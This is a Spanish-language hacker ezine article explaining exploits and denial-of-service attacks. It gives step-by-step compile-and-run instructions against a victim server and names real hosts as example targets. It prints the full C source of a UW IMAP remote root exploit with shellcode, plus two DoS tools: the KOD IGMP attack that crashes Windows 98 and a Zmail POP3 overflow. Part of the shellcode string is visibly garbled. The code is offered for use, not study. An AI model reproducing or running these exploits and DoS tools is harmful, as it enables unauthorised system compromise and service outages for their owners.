---
title: "0x007"
ezine: "heh"
---

# 0x007

**Ezine:** heh

<div className="ascii-content">

```
                                                                            
 
En este texto voy a explicar los metodos de usar un xploit y un DoS, tambien
la diferencia que hay entre uno y otro, y los resultados que provoca cada uno,
                       ademas de algunos ejemplos.

*******************************************************************************
La explicacion de este texto esta basada en principios generales, por lo que es
recomendado siempre leer el txt o el archivo fuente, de los Xploits o DoS, para
                      su debido buen funcionamiento.
*******************************************************************************
   
//////////////////////////////////////////////////////////////////////////////

                                 **********
                                 * Indice *
                                 **********
  

Que es un Xploit y para que se usa   ___________________________    ((A))

Que es un DoS y para que se usa      ---------------------------    ((B))

Donde encontrar Xploits y DoS        ---------------------------    ((C))

Despedida                            ---------------------------    ((D))


//////////////////////////////////////////////////////////////////////////////


################################# ((A)) ######################################

                             Que es un Xploit
			     ----------------
			        
  Un Xploit es un simple pero efectivo programa desarrollado generalmente bajo 
lenguaje C (Tambien, en perl, java, etc.) que tiene como finalidad el "Xplotar"
un bug determinado.  Hay diferentes tipos de Xploits, los remotos y los locales. 
  Los remotos se pueden utilizar sin tener acceso a una shell en el server de 
la victima (asi llamaremos al server que queremos hackear) o sea que los 
podremos ejecutar directamente desde nuestra maquina para que intente 
conseguir
acceso remotamente. 
  Generalmente estos Xploits se utilizan casi siempre con
 la siguiente sintaxis:

Primero se debe compilar el fichero.c, poniendo el 
comando (cc o gcc depende de nuestro compilador y 
nuestro OS) gcc nombredelarchivo.c -o nombredelarchivo 
Ej: 

# gcc imapd.c -o imapd

  Esto generara el archivo que ejecutaremos poniendo ./imapd
(ej: ./imapd www.microsoft.com) algunos Xploits remotos piden el 
offset, pondremos un numero bajo como 10,20, etc. 
  Despues de hacer esto habremos conseguido acceso como un user normal o 
como root. (depende del Xploit, comunmente esta especificado en el fuente del 
mismo). 
Pasamos a los Xploits
 locales, este tipo de Xploits requieren que previamente 
sean subidos al servidor de la victima a travez del FTP, y deben ser ejecutado 
desde una shell (accediendo con un Telnet generalmente), o sea primero se sube 
el archivo fuente a travez del FTP.
Ej:

 ftp ftp.microsoft.com 

  Logueamos con nuestro user y passwd, subimos el archivo con 
  
 FTP> send nombredelacrchivo.c
  
  Esto funcionara siempre que el servidor de FTP tenga accesos de escritura,
luego entramos a la shell 
 
 # telnet www.microsoft.com 

ponemos el user y el passwd y hacemos lo mismo que con el Xploit remoto, 
compilamos y ejecutamos, si todo a salido bien, obtendremos privilegios de root.

Ahora voy a poner el codigo en C de algunos Xploits.

Imapd (Este es un xploit que consigue una shell remotamente)
^^^^^
################################################
Este buf funciona con un Overflow que hace que
se ejecute una shell arbitrariamente, para mas
detalles de este tipo de Xploit:
SET 21 o Phrack 51
################################################

<----------------------------------- CUT HERE! ------------------------------->

<++> imapd.c
/*
   UW Imap remote exploit for x86Linux by Juan A. Fernandez Jimenez
   (carlosfdez@redestb.es)
   Systems affect: Ummm...I only tested it in IMAP4rev1v10.203
   Greetz to: Koji, Sud, Darkmoon, Marneus, NBH Group ...
   How to use: # (./imaplinux;cat) | nc target_host 143
   Note:
   This exploit is based in the remote exploit created by Cheez Whiz.
   You feel free to change the nops,offsets and esp...the shellcode is
   all original from me... :P ...no problems with toupper()
                ESP=0xBFFFF04C for v10.203
   22/07/98 23:26
*/

#define BUF 2048
#define NOP 0x90

char shellcode[]=
"\xeb\x33\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x80\x46"
"\x01\x80\x80\x46\x02\x80\x80\x46\x03\x80\x80\x46\x05\x80\x80\x46"
"\x06\x80\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
"\x89\xd8\x40\xcd\x80\xe8\xc8\xff\xff\xff/ΓΘε/≤Φ.........";

char buffer[BUF];
long int nop=422,esp=0xBFFFF04C,offset=100;

void main() {
int cont;

memset(buffer,NOP,sizeof(buffer));
memcpy(buffer+nop,shellcode,strlen(shellcode));

for(cont=nop+strlen(shellcode);cont < BUF-4;cont+=4) *((int *)
&buffer[cont])=esp+offset;

printf("* AUTHENTICATE {%d}\r\n",BUF);
for(cont=0;cont&lt;sizeof(buffer);cont++) putchar(buffer[cont]);
printf("\r\n");
}
<-->
  
<------------------------------- CUT HERE! ---------------------------------->

******************************************************************************

********************************** ((B)) *************************************

                                Que es un DoS
			        -------------
				
Un Denial of Services (DoS) tambien es un programa hecho generalmente en 
lenguaje C, la diferencia que tiene con los Xploits es que estos, no 
obtienen acceso al ordenador remota ni localmente, sino que provocan la caida 
del mismo (lo dejan fuera de servicio). 
  Estos programas se utilizan en la mayoria de los casos en forma remota, 
muchos de lo ultimos DoS mandan una cantidad de caracteres en algun comando
especifico y esto trae como cosecuencia que pueda crearse un Overflow, 
provocando, un desbordamiento de pila y la caida del servicio o del servidor.
  Los pasos a seguir para ejecutar estos DoS, son los siguientes. 
  Primero compilar el codigo fuente (generalmente archivo.c) colocando 

# gcc nombredelarchivo.c -o nombredelarchivo, 

y luego ejecutarlo de esta forma 

# ./nombredelarchivo (host).

Ahora voy a poner el codigo en C de algunos DoS.

##########################################################################
KOD (Este Dos es para bajar un Windows 98, manda un paquete del tipo 
IGMP, que Windows 98 para variar no lo soporta y hace que el TCP Stack se
caiga, creando una pantalla azul y automaticamente cerrando toda conexion
TCP)
##########################################################################

<------------------------------- CUT HERE! ---------------------------------->

<++> kod.c
#include &lt;stdio.h>
#include &lt;netdb.h>
#include &lt;string.h>
#include &lt;unistd.h>
#include &lt;errno.h>
#include &lt;sys/types.h>
#include &lt;sys/socket.h>
#include &lt;netinet/in.h>
size_t hits = 5;
unsigned short port = 100;
void usage (char *progname)
{
  printf("Usage: %s &lt;host> -p port -t hits\n", progname);
  exit(1);
}
void parse_args (int argc, char *argv[], char **target)
{
 int y;
 *target = argv[1];

 if (argv[1][0] == '-') {
  printf ("Must specify a target.\n");
  exit (1);
 }
 for (y=2; y < argc; y++) {
  if (!strcmp(argv[y], "-p")) {
   y++;
   port = atoi (argv[y]);
  } else if (!strcmp(argv[y], "-t")) {
   y++;
   hits = atoi (argv[y]);
  }
 }
}

int main (int argc, char *argv[])
{
 struct sockaddr_in sin;
 struct hostent *he;
 size_t maxpkt = 15000;
 char *target;
 char buf[15000];
 int sd;

 if (argc < 2)
  usage (argv[0]);
 parse_args (argc, argv, &target);
 if ((he = gethostbyname (target)) == NULL) {
  herror (target);
  exit (1);
 }
 memcpy (&sin.sin_addr.s_addr, he->h_addr, he->h_length);

 sin.sin_family = AF_INET;
 sin.sin_port = htons (port);

 if ((sd = socket (AF_INET, SOCK_RAW, 2)) == -1) {
  perror ("error: socket()");
  exit (1);
 }
 if (-1 == connect (sd, (struct sockaddr *)&sin, sizeof (sin))) {
  perror ("error: connect()");
  close (sd);
  exit (1);
 }
 puts ("Determining max MSGSIZE");
 while (send (sd, buf, maxpkt, 0) == -1) {
  if (EMSGSIZE != errno) {
   perror ("error: send()");
   close (sd);
   exit (1);
  }
  maxpkt -= 1;
 }
 hits--;
 printf ("Max MSGSIZE is %d\n..%d bytes [%s:%d]..\n", maxpkt,
   maxpkt, target, port);
 while (hits--) {
  usleep (50000);
  if (send (sd, buf, maxpkt, 0) == -1) {
   perror ("error: send()");
   close (sd);
   exit (1);
  }
  printf ("..%d bytes [%s:%d]..\n", maxpkt, target, port);
 }
 sleep (1);
 close (sd);
 puts ("complete.");

 exit (0);
}
<-->

<------------------------------- CUT HERE! ----------------------------------->

############################################################################
Este Overflow descubiero por los pibes de Ussr Labs funciona con 
Windows 95/98/NT y lo que hace es atacar el Servicio de POP3 que provee
la aplicacion Zmail.
Simplemente se conecta al puerto 110 y pone user ...
en donde ... son mas de 3400 caracteres basuras, como ya habiamos explicado
esto genera un Overflow que hace caer al servicio Zmail.
############################################################################ 

<------------------------------- CUT HERE! ----------------------------------->

<++> zmail.c
#include &lt;sys/types.h>
#include &lt;sys/socket.h>
#include &lt;netinet/in.h>
#include &lt;arpa/inet.h>
#include &lt;netdb.h>
#include &lt;stdlib.h>
#include &lt;string.h>
#include &lt;stdio.h>


char dos_code[3500];
char buffy[256];
char *host;
int ip, port, sockfd;
struct sockaddr_in      servaddr;
struct hostent          *phost;

int
main(int argc, char **argv)
{
if(argc < 2){
        printf("Example DOS code for Zmail by Ussr labs.\n\n");
        printf("Usage: %s hostname port (default 110)\n", argv[0]);
        return(0);
        }
if(argc == 2){
        port = 110;
}
else {
        sscanf(argv[2], "%hd", (char *)&port);
        }
        printf("Example DOS code for Zmail by Ussr labs.\n\n");

        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
                {
                printf("Error in socket funtion\n\n");
                return(0);
                }
        
        bzero(&servaddr, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(port);

        host = argv[1];
        if(phost = gethostbyname(host)) {
                bcopy(phost->h_addr, (char *)&ip, sizeof(u_long));
        }
        else if((ip = inet_addr(host)) == -1)
                {
                printf("ERROR! Cant resolve: %s \n\n", argv[1]);
                return(0);
                }

        servaddr.sin_addr.s_addr = ip;
        if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0
)
                {
                printf("ERROR! Cant connect to: %s port %d\n\n", argv[1], port)
;
                return(0);
                }
        memset(buffy, 0, sizeof(buffy));
        recv(sockfd, &buffy, sizeof(buffy), 0);
                printf("%s",buffy);
        memset(dos_code, 0x61, sizeof(dos_code));
                dos_code[3498] = '\r';
                dos_code[3499] = '\n';
                memcpy(&dos_code[0], "user ", strlen("user "));
        send(sockfd, dos_code, sizeof(dos_code), 0);
        
        memset(buffy, 0, sizeof(buffy));
        recv(sockfd, &buffy, sizeof(buffy), 0);
                printf("%s",buffy);

                memcpy(&dos_code[0], "pass ", strlen("pass "));
        send(sockfd, dos_code, sizeof(dos_code), 0);

        printf("DOS code are send OK!..\n");
        
close(sockfd);
        return(0);
}
<-->

<------------------------------- CUT HERE! ----------------------------------->

********************************** ((C)) *************************************
				
		        Donde encontrar Xploits y DoS
                        -----------------------------
			
      		        <<< www.digitalrebel.net >>>                       
 
		      <<<  packetstorm.securify.com >>>
		      
		         <<<  www.antionline.com >>>

                        <<< www.securityfocus.com >>>
			
			   <<< neworder.box.sk >>>
			   
		              <<< hack.co.za >>>
			     
			     
********************************** ((D)) *************************************

                                 Despedida
                                 ---------
				 
Bueno a llegado el momento de la despedida, espero que este articulo les sea 
de ayuda para comprender el correcto uso de estos programitas, y poderlos
utilizar al maximo.


		Agradezco a todo Digital Rebel, y en especial a Zomba.

		                  	NW2O 
	      		    (nwoolf@softhome.net)
			     
    -EOF-

```

</div>
